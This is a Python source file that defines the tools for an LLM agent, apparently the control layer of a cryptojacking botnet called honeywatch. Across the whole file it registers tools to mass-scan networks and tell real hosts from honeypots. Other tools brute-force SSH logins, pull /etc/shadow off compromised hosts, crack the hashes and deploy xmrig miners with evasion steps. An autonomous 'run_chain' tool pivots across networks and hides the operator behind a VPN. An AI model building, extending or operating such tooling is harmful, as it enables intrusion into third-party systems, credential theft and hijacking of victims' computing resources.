"""Callable tools exposed to the honeywatch chat agent.

Each tool is a function that accepts a dict of arguments and returns a dict
result. The agent parses tool calls from the LLM, executes them, and feeds the
results back into the conversation. Tools are intentionally coarse-grained so
a single command like "scan 10.0.0.0/24 and deploy xmrig on real hosts" can be
broken into scan + deploy + report.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
from typing import Any, Callable

from honeywatch.agent.setup import AgentConfig, SetupStore
from honeywatch.c2.store import C2Store
from honeywatch.config import load_config
from honeywatch.models import Fingerprint, HostHit, Score, Target
from honeywatch.ops import (
    TargetFilter,
    build_manifest,
    enqueue_operation,
    prepare_evasion_pipeline,
    select_targets,
)
from honeywatch.payloads import get_payload, list_payloads
from honeywatch.pipeline import Pipeline
from honeywatch.store import Store

ToolFunc = Callable[[dict[str, Any], "ToolContext"], dict[str, Any]]


class ToolContext:
    """Shared runtime context passed to every tool execution."""

    def __init__(
        self,
        db_path: str = "honeywatch.db",
        agent_config: AgentConfig | None = None,
        skip_vpn_check: bool = False,
    ):
        self.db_path = db_path
        self.agent_config = agent_config or AgentConfig()
        self.skip_vpn_check = skip_vpn_check
        self._store: Store | None = None
        self._c2_store: C2Store | None = None

    @property
    def store(self) -> Store:
        if self._store is None:
            self._store = Store(self.db_path)
        return self._store

    @property
    def c2_store(self) -> C2Store:
        if self._c2_store is None:
            self._c2_store = C2Store(self.db_path)
        return self._c2_store


def _require_vpn(ctx: ToolContext) -> bool:
    """Return True when a network tool may proceed."""
    from honeywatch.vpn import DEFAULT_TIMEOUT, require_mullvad

    if ctx.skip_vpn_check:
        return True
    cfg = load_config()
    vpn_cfg = getattr(cfg, "vpn", None)
    required = bool(getattr(vpn_cfg, "required", True)) if vpn_cfg else True
    if not required:
        return True
    timeout = getattr(vpn_cfg, "timeout_s", DEFAULT_TIMEOUT) if vpn_cfg else DEFAULT_TIMEOUT
    # require_mullvad always returns a plain bool (quiet only mutes logging).
    if require_mullvad(timeout=timeout, quiet=True):
        return True
    print(
        "honeywatch: REFUSED - Mullvad VPN is not connected. "
        "Pass skip_vpn_check=true or connect Mullvad.",
        file=sys.stderr,
    )
    return False


_TOOL_SPECS: list[dict[str, Any]] = [
    {
        "name": "list_payloads",
        "description": "List available red-team payload IDs and categories.",
        "parameters": {
            "type": "object",
            "properties": {
                "category": {
                    "type": "string",
                    "description": "Optional category filter: miner, exploit, or evasion.",
                }
            },
        },
    },
    {
        "name": "get_status",
        "description": "Return the current database status: total hosts and label counts.",
        "parameters": {"type": "object", "properties": {}},
    },
    {
        "name": "scan",
        "description": "Run a masscan/zmap discovery + SSH probe over a target range.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {
                    "type": "string",
                    "description": "Comma-separated IPs/CIDRs to scan, e.g. 10.0.0.0/24.",
                },
                "tool": {
                    "type": "string",
                    "description": "Scanner tool: masscan or zmap. Default masscan.",
                },
                "ports": {
                    "type": "string",
                    "description": "Ports to scan, default 22.",
                },
                "rate": {
                    "type": "integer",
                    "description": "Packets per second. Default 1000.",
                },
                "max_hosts": {
                    "type": "integer",
                    "description": "Cap how many hosts are probed and scored.",
                },
                "probe_level": {
                    "type": "string",
                    "description": "fast or full (full needs paramiko).",
                },
                "skip_vpn_check": {
                    "type": "boolean",
                    "description": "Bypass the Mullvad VPN gate for controlled testing.",
                },
            },
            "required": ["targets"],
        },
    },
    {
        "name": "probe_host",
        "description": "Fingerprint and classify a single SSH host.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {
                    "type": "string",
                    "description": "ip[:port] to probe.",
                },
                "probe_level": {
                    "type": "string",
                    "description": "fast or full.",
                },
                "skip_vpn_check": {
                    "type": "boolean",
                    "description": "Bypass the Mullvad VPN gate.",
                },
            },
            "required": ["host"],
        },
    },
    {
        "name": "deploy",
        "description": "Build and enqueue a payload deployment against selected targets.",
        "parameters": {
            "type": "object",
            "properties": {
                "payload_id": {
                    "type": "string",
                    "description": "Payload to deploy, e.g. xmrig, xmrigcc, stratum, metasploit.",
                },
                "target_label": {
                    "type": "string",
                    "description": "Filter targets by final label: real, likely_real, uncertain, likely_honeypot, honeypot.",
                },
                "min_confidence": {
                    "type": "number",
                    "description": "Minimum final confidence. Default 0.7.",
                },
                "max_confidence": {
                    "type": "number",
                    "description": "Maximum final confidence. Default 1.0.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max number of targets.",
                },
                "target_file": {
                    "type": "string",
                    "description": "Path to file with ip[:port] lines; if omitted, use store.",
                },
                "evasion": {
                    "type": "string",
                    "description": "Comma-separated evasion payload ids, e.g. upx,symbol_strip.",
                },
                "exec_mode": {
                    "type": "string",
                    "description": "dry_run, local_simulate, or ssh.",
                },
                "ssh_user": {
                    "type": "string",
                    "description": "SSH user for ssh mode.",
                },
                "ssh_key": {
                    "type": "string",
                    "description": "SSH private key path.",
                },
                "variables": {
                    "type": "object",
                    "description": "Extra payload variables. For miner payloads, wallet/pool/worker/pass/tls are auto-filled from setup unless overridden here.",
                },
            },
            "required": ["payload_id"],
        },
    },
    {
        "name": "report",
        "description": "Generate a JSON/CSV/Markdown report from the store.",
        "parameters": {
            "type": "object",
            "properties": {
                "format": {
                    "type": "string",
                    "description": "json, csv, or md. Default json.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Number of rows. Default 20.",
                },
                "label": {
                    "type": "string",
                    "description": "Filter by final label.",
                },
                "min_confidence": {
                    "type": "number",
                    "description": "Minimum confidence. Default 0.0.",
                },
            },
        },
    },
    {
        "name": "get_operations",
        "description": "List C2 operations and their statuses.",
        "parameters": {
            "type": "object",
            "properties": {
                "status": {
                    "type": "string",
                    "description": "Filter by status: pending, running, completed, failed.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max operations to return.",
                },
            },
        },
    },
    {
        "name": "get_tasks",
        "description": "List C2 tasks, optionally filtered by operation or status.",
        "parameters": {
            "type": "object",
            "properties": {
                "operation_id": {
                    "type": "string",
                    "description": "Filter by operation id.",
                },
                "status": {
                    "type": "string",
                    "description": "Filter by status.",
                },
                "limit": {
                    "type": "integer",
                    "description": "Max tasks to return.",
                },
            },
        },
    },
    {
        "name": "set_wallet",
        "description": "Update the default mining wallet/pool configuration in setup.",
        "parameters": {
            "type": "object",
            "properties": {
                "pool": {"type": "string"},
                "wallet": {"type": "string"},
                "pass": {"type": "string"},
                "worker": {"type": "string"},
                "tls": {"type": "boolean"},
            },
        },
    },
    {
        "name": "set_ollama",
        "description": "Update the Ollama API configuration in setup.",
        "parameters": {
            "type": "object",
            "properties": {
                "api_key": {"type": "string"},
                "base_url": {"type": "string"},
                "model": {"type": "string"},
            },
        },
    },
    {
        "name": "crack_ssh",
        "description": "Online SSH password cracking against one or more hosts. Persists recovered credentials to the store for later deploy runs.",
        "parameters": {
            "type": "object",
            "properties": {
                "hosts": {
                    "type": "string",
                    "description": "Comma-separated ip[:port] hosts to crack, e.g. 10.0.0.5,10.0.0.6:2222.",
                },
                "target_label": {
                    "type": "string",
                    "description": "Pull hosts from the store by final label instead of passing hosts.",
                },
                "min_confidence": {"type": "number"},
                "limit": {"type": "integer"},
                "users": {
                    "type": "string",
                    "description": "Comma-separated usernames to try (default: built-in population).",
                },
                "user": {"type": "string"},
                "wordlist": {"type": "string"},
                "passwords": {"type": "string"},
                "no_mutations": {"type": "boolean"},
                "concurrency": {"type": "integer"},
                "max_attempts": {"type": "integer"},
                "timeout": {"type": "number"},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["hosts"],
        },
    },
    {
        "name": "list_credentials",
        "description": "List cracked SSH credentials stored by crack_ssh.",
        "parameters": {
            "type": "object",
            "properties": {
                "ip": {"type": "string"},
                "user": {"type": "string"},
                "limit": {"type": "integer"},
            },
        },
    },
    {
        "name": "grab_shadow",
        "description": "SFTP-exfil /etc/shadow from a popped host using cracked creds (auto-fills from the store).",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "ip[:port] to exfil from."},
                "user": {"type": "string"},
                "pass": {"type": "string"},
                "key": {"type": "string"},
                "stash": {"type": "string"},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["host"],
        },
    },
    {
        "name": "hashcrack",
        "description": "Offline-crack an /etc/shadow file with hashcat or john, persisting recovered passwords to the store.",
        "parameters": {
            "type": "object",
            "properties": {
                "shadow": {"type": "string", "description": "path to /etc/shadow or a stash dir from grab_shadow."},
                "wordlist": {"type": "string"},
                "tool": {"type": "string", "description": "hashcat or john (default hashcat)."},
                "mode": {"type": "integer"},
                "ip": {"type": "string", "description": "record creds against this host in the store."},
                "port": {"type": "integer"},
                "no_save": {"type": "boolean"},
            },
            "required": ["shadow", "wordlist"],
        },
    },
    {
        "name": "run_chain",
        "description": "Run the autonomous cryptojacker chain: scan -> spray -> foothold -> hashcrack -> deploy xmrig -> pivot, looping on growth. Give it targets + pool/wallet and it drives the whole botnet.",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {"type": "string", "description": "comma-separated CIDRs/IPs for recon, e.g. 10.0.0.0/24"},
                "users": {"type": "string"},
                "passwords": {"type": "string"},
                "payload": {"type": "string", "description": "default xmrig"},
                "pool": {"type": "string", "description": "mining pool URL (required for miner deploy)"},
                "wallet": {"type": "string", "description": "wallet address (required for miner deploy)"},
                "hashcrack_wordlist": {"type": "string"},
                "business_hours": {"type": "boolean"},
                "max_rounds": {"type": "integer"},
                "skip_vpn_check": {"type": "boolean"},
            },
            "required": ["pool", "wallet"],
        },
    },
]


def _tool(name: str, func: ToolFunc) -> None:
    spec = next((s for s in _TOOL_SPECS if s["name"] == name), None)
    if spec is None:
        raise ValueError(f"missing tool spec for {name!r}")
    TOOL_REGISTRY[name] = {"func": func, "spec": spec}


TOOL_REGISTRY: dict[str, dict[str, Any]] = {}


# --------------------------------------------------------------------------- #
# Tool implementations
# --------------------------------------------------------------------------- #


def _tool_list_payloads(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    category = args.get("category")
    payloads = list_payloads(category)
    return {
        "payloads": [
            {
                "id": p.id,
                "category": p.category,
                "name": p.name,
                "description": p.description,
                "install_type": p.install_type,
                "tags": p.tags,
            }
            for p in payloads
        ]
    }


def _tool_get_status(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    stats = ctx.store.stats()
    return {"status": stats}


def _tool_scan(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the scan. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_ports

    cfg = load_config()
    store = ctx.store
    targets = [t.strip() for t in args["targets"].split(",") if t.strip()]
    tool = args.get("tool", "masscan")
    ports = parse_ports(args.get("ports", "22"))
    rate = int(args.get("rate", 1000))
    max_hosts = args.get("max_hosts")
    probe_level = args.get("probe_level", "fast")

    # Update config with CLI-equivalent overrides for the pipeline.
    _set(cfg.probe, "level", probe_level)

    async def _run():
        pipeline = Pipeline(cfg, store=store)
        return await pipeline.scan(
            targets=targets,
            tool=tool,
            ports=ports,
            rate=rate,
            max_hosts=max_hosts,
            skip_vpn_check=True,  # already checked above
        )

    scores = asyncio.run(_run())
    return {
        "scanned": len(scores),
        "summary": _summarize_scores(scores),
        "top": [_score_summary(s) for s in sorted(scores, key=lambda x: x.final_confidence, reverse=True)[:10]],
    }


def _tool_probe_host(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the probe. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host

    cfg = load_config()
    ip, port = parse_host(args["host"])
    level = args.get("probe_level", getattr(cfg.probe, "level", "fast"))
    _set(cfg.probe, "level", level)

    async def _run():
        pipeline = Pipeline(cfg)
        fps = await pipeline.probe_hosts([HostHit(ip=ip, port=port)])
        if not fps:
            return []
        return await pipeline.analyze_and_score(fps)

    scores = asyncio.run(_run())
    if not scores:
        return {"error": "no fingerprint captured"}
    return {"result": _score_summary(scores[0])}


def _tool_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    payload_id = args["payload_id"]
    variables = dict(args.get("variables", {}))

    # Auto-fill miner variables from agent setup unless overridden.
    if payload_id in {"xmrig", "xmrigcc"}:
        cfg = ctx.agent_config
        if cfg.pool and "pool" not in variables:
            variables["pool"] = cfg.pool
        if cfg.wallet and "wallet" not in variables:
            variables["wallet"] = cfg.wallet
        if cfg.pass_ and "pass" not in variables:
            variables["pass"] = cfg.pass_
        if cfg.worker and "worker" not in variables:
            variables["worker"] = cfg.worker
        if "tls" not in variables:
            variables["tls"] = str(cfg.tls).lower()

    missing = []
    if payload_id in {"xmrig", "xmrigcc"}:
        if not variables.get("pool"):
            missing.append("pool")
        if not variables.get("wallet"):
            missing.append("wallet")
    if missing:
        return {
            "error": f"payload {payload_id!r} missing required variables: {', '.join(missing)}. Run set_wallet or provide them in variables.",
        }

    targets: list[Target] = []
    target_file = args.get("target_file")
    if target_file:
        from honeywatch.cli import parse_host

        with open(target_file, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                ip, port = parse_host(line)
                targets.append(
                    Target(
                        ip=ip,
                        port=port,
                        allowed_categories=[],
                        ssh_user=args.get("ssh_user", ctx.agent_config.ssh_user),
                        ssh_key=args.get("ssh_key"),
                    )
                )
    else:
        label = args.get("target_label")
        labels = {label} if label else {"real", "likely_real"}
        filter_ = TargetFilter(
            labels=labels,
            min_confidence=args.get("min_confidence", 0.7),
            max_confidence=args.get("max_confidence", 1.0),
            limit=args.get("limit"),
        )
        targets = select_targets(
            ctx.store,
            filter_,
            args.get("ssh_user", ctx.agent_config.ssh_user),
            args.get("ssh_key"),
        )

    if not targets:
        return {"error": "no targets matched"}

    # Auto-fill cracked credentials from the store so a chat-driven "crack
    # then deploy" loop needs no extra args. Explicit user/key still win.
    if not args.get("ssh_user") and not args.get("ssh_key"):
        for target in targets:
            if target.ssh_user and target.ssh_pass:
                continue
            cred = ctx.store.credential_for(target.ip, target.port)
            if not cred:
                continue
            if not target.ssh_user:
                target.ssh_user = cred.get("user")
            if not target.ssh_pass:
                target.ssh_pass = cred.get("password")

    evasion = prepare_evasion_pipeline(args.get("evasion"))
    manifest = build_manifest(payload_id, targets, variables, evasion)
    op = enqueue_operation(ctx.c2_store, manifest)
    return {
        "operation_id": op.id,
        "payload_id": payload_id,
        "targets": len(targets),
        "status": op.status,
    }


def _tool_report(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    fmt = args.get("format", "json")
    limit = int(args.get("limit", 20))
    label = args.get("label")
    min_confidence = float(args.get("min_confidence", 0.0))
    scores = ctx.store.query_scores(limit=limit, label=label, min_confidence=min_confidence)
    return {
        "format": fmt,
        "rows": len(scores),
        "data": [_score_summary(s) for s in scores],
    }


def _tool_get_operations(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    status = args.get("status")
    limit = int(args.get("limit", 50))
    ops = ctx.c2_store.list_operations(status=status, limit=limit)
    return {
        "operations": [
            {
                "id": o.id,
                "payload_id": o.payload_id,
                "status": o.status,
                "targets": len(o.target_ips),
                "created_at": o.created_at,
                "updated_at": o.updated_at,
            }
            for o in ops
        ]
    }


def _tool_get_tasks(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    operation_id = args.get("operation_id")
    status = args.get("status")
    limit = int(args.get("limit", 100))
    tasks = ctx.c2_store.list_tasks(
        operation_id=operation_id, status=status, limit=limit
    )
    return {
        "tasks": [
            {
                "id": t.id,
                "operation_id": t.operation_id,
                "payload_id": t.payload_id,
                "category": t.category,
                "target": f"{t.target.ip}:{t.target.port}" if t.target else None,
                "status": t.status,
                "worker_id": t.worker_id,
            }
            for t in tasks
        ]
    }


def _tool_set_wallet(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    cfg = ctx.agent_config
    if "pool" in args:
        cfg.pool = args["pool"]
    if "wallet" in args:
        cfg.wallet = args["wallet"]
    if "pass" in args:
        cfg.pass_ = args["pass"]
    if "worker" in args:
        cfg.worker = args["worker"]
    if "tls" in args:
        cfg.tls = bool(args["tls"])
    SetupStore(ctx.db_path).save_config(cfg)
    return {"ok": True, "wallet": cfg.wallet, "pool": cfg.pool, "worker": cfg.worker}


def _tool_set_ollama(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    cfg = ctx.agent_config
    if "api_key" in args:
        cfg.ollama_api_key = args["api_key"]
    if "base_url" in args:
        cfg.ollama_base_url = args["base_url"]
    if "model" in args:
        cfg.ollama_model = args["model"]
    SetupStore(ctx.db_path).save_config(cfg)
    return {
        "ok": True,
        "base_url": cfg.ollama_base_url,
        "model": cfg.ollama_model,
    }


def _tool_crack_ssh(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the crack run. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host
    from honeywatch.crack import CrackTarget, crack_targets, load_wordlist

    cfg = load_config()
    crack_cfg = getattr(cfg, "crack", None)
    concurrency = int(args.get("concurrency") or getattr(crack_cfg, "concurrency", 8))
    timeout_s = float(args.get("timeout") or getattr(crack_cfg, "timeout_s", 6.0))
    max_attempts = args.get("max_attempts")
    if max_attempts is not None:
        max_attempts = int(max_attempts)
    else:
        max_attempts = getattr(crack_cfg, "max_attempts", None)
    mutations = (not bool(args.get("no_mutations", False))) and bool(getattr(crack_cfg, "mutations", True))

    users: list[str] = []
    if args.get("user"):
        users = [args["user"]]
    elif args.get("users"):
        users = [u.strip() for u in args["users"].split(",") if u.strip()]

    passwords: list[str] = []
    if args.get("passwords"):
        passwords = [p.strip() for p in args["passwords"].split(",") if p.strip()]

    wordlist: list[str] | None = None
    if args.get("wordlist"):
        wordlist = load_wordlist(args["wordlist"])

    hosts: list[tuple[str, int]] = []
    raw = args.get("hosts") or ""
    for spec in raw.split(","):
        spec = spec.strip()
        if spec:
            ip, port = parse_host(spec)
            hosts.append((ip, port))

    if not hosts and (args.get("target_label") or args.get("min_confidence") is not None):
        rows = ctx.store.query(
            limit=int(args.get("limit") or 1000),
            label=args.get("target_label"),
            min_confidence=float(args.get("min_confidence") or 0.0),
        )
        for row in rows:
            hosts.append((row["ip"], int(row["port"])))

    if not hosts:
        return {"error": "no targets. Pass hosts=... or target_label/min_confidence."}

    targets = [
        CrackTarget(
            ip=ip, port=port, users=users, passwords=passwords,
            wordlist=wordlist, mutations=mutations,
            max_attempts=max_attempts, timeout_s=timeout_s,
        )
        for ip, port in hosts
    ]

    results = asyncio.run(crack_targets(targets, concurrency=concurrency))

    for res in results:
        if res.success:
            ctx.store.upsert_credential(
                res.ip, res.port, res.user or "", res.password,
                banner=res.banner, attempts=res.attempts, source="crack",
            )

    wins = [r.credential() for r in results if r.success]
    return {
        "hosts": len(results),
        "successes": len(wins),
        "attempts": sum(r.attempts for r in results),
        "credentials": wins,
        "results": [r.credential() for r in results],
    }


def _tool_list_credentials(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    rows = ctx.store.query_credentials(
        ip=args.get("ip"), user=args.get("user"),
        limit=int(args.get("limit", 100)),
    )
    return {"count": len(rows), "credentials": rows}


def _tool_grab_shadow(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the grab. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host
    from honeywatch.hashcrack import grab_shadow

    ip, port = parse_host(args["host"])
    user = args.get("user")
    passw = args.get("pass")
    if (not user or not passw) and not args.get("key"):
        cred = ctx.store.credential_for(ip, port)
        if cred:
            user = user or cred.get("user")
            passw = passw or cred.get("password")
    res = grab_shadow(
        ip=ip, port=port, user=user, password=passw, key_path=args.get("key"),
        stash_dir=args.get("stash", ".honeywatch/shadow_stash"),
        timeout_s=10.0,
    )
    return res


def _tool_hashcrack(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    import os
    from honeywatch.hashcrack import crack_shadow

    shadow_path = args["shadow"]
    if os.path.isdir(shadow_path):
        sub = os.path.join(shadow_path, "shadow")
        if os.path.isfile(sub):
            shadow_path = sub
    if not os.path.isfile(shadow_path):
        return {"error": "shadow file not found: " + args["shadow"]}

    tool = args.get("tool", "hashcat")
    mode = args.get("mode")
    if mode is not None:
        mode = int(mode)
    result = crack_shadow(
        shadow_path=shadow_path,
        wordlist=args["wordlist"],
        tool=tool,
        mode=mode,
        timeout_s=args.get("timeout"),
    )
    creds = result.credentials()
    if creds and not bool(args.get("no_save", False)):
        ip = args.get("ip") or ""
        port = int(args.get("port", 22))
        for c in creds:
            if ip:
                ctx.store.upsert_credential(
                    ip, port, c["user"], c["password"],
                    banner=None, attempts=1,
                    source="hashcat" if tool == "hashcat" else "john",
                )
    return {
        "tool": result.tool,
        "attempted": result.attempted,
        "cracked": len(creds),
        "error": result.error,
        "returncode": result.returncode,
        "credentials": creds,
    }


def _tool_run_chain(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the chain. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.chain import ChainConfig, run_chain

    targets = [t.strip() for t in (args.get("targets") or "").split(",") if t.strip()]
    cfg = ChainConfig(
        targets=targets,
        users=[u.strip() for u in (args.get("users") or "").split(",") if u.strip()],
        passwords=[p.strip() for p in (args.get("passwords") or "").split(",") if p.strip()],
        payload_id=args.get("payload", "xmrig"),
        pool=args.get("pool", ""),
        wallet=args.get("wallet", ""),
        hashcrack_wordlist=args.get("hashcrack_wordlist", ""),
        business_hours=bool(args.get("business_hours", False)),
        max_rounds=int(args.get("max_rounds", 3)),
        skip_vpn_check=skip,
        db_path=ctx.db_path,
    )
    state = run_chain(cfg)
    return {
        "rounds": state.round,
        "hosts": len(state.hosts),
        "credentials": len(state.credentials),
        "footholds": len(state.footholds),
        "enqueued": len(state.enqueued),
        "stopped": state.stopped,
        "stop_reason": state.stop_reason,
    }


def _summarize_scores(scores: list[Score]) -> dict[str, int]:
    from collections import Counter

    return dict(Counter(s.final_label for s in scores))


def _score_summary(s: Score) -> dict[str, Any]:
    return {
        "ip": s.ip,
        "port": s.port,
        "label": s.final_label,
        "confidence": s.final_confidence,
        "banner": s.fingerprint.banner if s.fingerprint else None,
        "software": s.fingerprint.software if s.fingerprint else None,
        "version": s.fingerprint.software_version if s.fingerprint else None,
        "flags": s.signals.flags if s.signals else [],
    }


def _set(obj, name: str, value: Any) -> None:
    try:
        setattr(obj, name, value)
    except Exception:
        pass


# Register tools.
_tool("list_payloads", _tool_list_payloads)
_tool("get_status", _tool_get_status)
_tool("scan", _tool_scan)
_tool("probe_host", _tool_probe_host)
_tool("deploy", _tool_deploy)
_tool("report", _tool_report)
_tool("get_operations", _tool_get_operations)
_tool("get_tasks", _tool_get_tasks)
_tool("set_wallet", _tool_set_wallet)
_tool("set_ollama", _tool_set_ollama)
_tool("crack_ssh", _tool_crack_ssh)
_tool("list_credentials", _tool_list_credentials)
_tool("grab_shadow", _tool_grab_shadow)
_tool("hashcrack", _tool_hashcrack)
_tool("run_chain", _tool_run_chain)


def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    """Execute a tool by name and return its result."""
    if name not in TOOL_REGISTRY:
        return {"error": f"unknown tool: {name!r}"}
    try:
        return TOOL_REGISTRY[name]["func"](args, ctx)
    except Exception as exc:
        return {"error": f"tool {name!r} failed: {exc!r}"}
